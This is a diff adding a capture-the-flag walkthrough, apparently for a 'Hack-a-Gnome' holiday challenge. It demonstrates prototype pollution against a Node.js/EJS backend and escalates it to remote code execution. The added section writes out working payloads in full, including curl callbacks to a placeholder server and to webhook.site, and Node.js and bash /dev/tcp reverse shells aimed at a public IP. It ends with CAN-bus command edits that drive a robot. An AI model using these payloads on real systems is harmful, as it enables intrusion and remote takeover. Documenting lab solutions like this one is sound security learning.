@@ -82,31 +82,101 @@ Once logged in we are presented with the Smart Gnome Control Center as Bruce:
 
 The hint indicates that we should be attempting prototype pollution of the statistics panel.
 
-the following reference is helpful for understanding prototye polution: https://www.youtube.com/watch?v=W9_x8pc_bh8
+![Hack-a-Gnome Password Statistics Panel](/images/hack-a-gnome_statistics_panel.jpg) 
+
+The following reference is helpful for understanding prototye polution: https://www.youtube.com/watch?v=W9_x8pc_bh8
+
+Testing prototype pollution:
+
+Key:__proto__
+
+Subkey: toString
+
+Value: a
+
+Message: message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22toString%22%2C%22value%22%3A%22a%22%7D
+
+Sending via Burp:
+
+![Hack-a-Gnome PrototypePollution](/images/hack-a-gnome_prototypepollution.jpg) 
+ 
+Results in a broken application:
+
+![Hack-a-Gnome PrototypePollutionSuccess](/images/hack-a-gnome_prototypepollutionsuccess.jpg) 
+ 
+Prototype pollution is possible. Server Headers indicate “Express” which is Node.js. The hint indicates that there are backend templates. Googling "what is the most common template package used with Node.js" indicates that EJS is the most popular package. EJS is also be susceptible to RCE using prototype pollution.
 
 
-Step by step solution complete with any code used
-  
-![Sample image alt text](/images/objectivename_purpose.jpg) 
-
-
-```sh
-bash script code block
+This is the payload:
+```
+{
+  "action": "update",
+  "key": "__proto__",
+  "subkey": "outputFunctionName",
+  "value": "x;process.mainModule.require('child_process').execSync('curl http://YOUR-SERVER');s"
+}
 ```
 
-Ordered list:
-1. Item 1
-2. Item 2
-3. Item 3
+URL Encoded:
+```
+message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20http%3A%2F%2FYOUR-SERVER')%3Bs%22%7D
+```
 
-Unordered list:
+Payload that uses webhook.site as a sensor:
 
-- Item
-- Item
-- Item
-/usr/local/weather/temperature
+message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20https%3A%2F%2Fwebhook.site%2Ff3bc21bc-b85f-4bb1-9bf2-bd4ac5767b96')%3Bs%22%7D
 
-**Answer: Flag or Answer**
+Webhook detects the connection:
+
+![Hack-a-Gnome Webhook Connection](/images/hack-a-gnome_webhookconnection.jpg) 
+
+Weaponizing with Node.JS reverse shell:
+```
+{
+  "action": "update",
+  "key": "__proto__",
+  "subkey": "outputFunctionName",
+  "value": "x;require('child_process').exec('node -e \\'require(\"net\").connect({port:4444,host:\"173.255.237.30 \"},function(){this.pipe(require(\"child_process\").spawn(\"/bin/sh\",[]).stdin);require(\"child_process\").spawn(\"/bin/sh\",[]).stdout.pipe(this);})\\'');s"
+}
+```
+
+Setup a linode linux system with a public IP and a listener on port 4444 to catch the shell.
+
+The message payload for the shell:
+```
+message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F173.255.237.30%2F4444%200%3E%261%5C%22')%3Bs%22%7D
+```
+
+![Hack-a-Gnome Reverse Shell](/images/hack-a-gnome_reverseshell.jpg) 
+
+Once the payload is sent, trigger a refresh in the application to load (change name + refresh)
+
+There is lots of canbus data, but nothing really useful. Lets refer back to the README.md
+
+The README.md shows that CAN IDs are grouped by type or purpose. 400 codes are requests, 300 codes are status. It is reasonable to assume that commands are a separate group, either 200 or 500 codes.Lets start with 200, and assume they are sequential. Let’s start with 200-204.  I need to note that while the shell is active, I am unable to get any feedback to commands. I need to change the python file, disconnect, and then test.
+
+```sh
+sed -i 's/0x244/0x200/g' canbus_client.py   # up
+sed -i 's/0x245/0x201/g' canbus_client.py   # down
+sed -i 's/0x246/0x202/g' canbus_client.py   # left
+sed -i 's/0x247/0x203/g' canbus_client.py   # right
+```
+
+Trial and error reveals the codes:
+
+- 0x201 = UP  
+
+- 0x202 = DOWN  
+
+- 0x204 = RIGHT 
+
+- 0x203 = LEFT 
+
+With control of the robot, boxes need to be moved so the power switch can be reached. The robot can only move a single box, so that limits the path.
+
+![Hack-a-Gnome Solution](/images/hack-a-gnome_Solution.jpg) 
+
+**Answer: Reach the power switch and shut down the factory**
 
 </details>
 
@@ -117,6 +187,8 @@ Unordered list:
 | crackstation.net |  | 
 | Burpsuite Community Edition |  |
 | Claude.ai |  | 
+| Ubuntu Linux Linode  |   |
+| Webhook.net |   |
 
 ## Hints Reference
 | Provided By         | Hint |
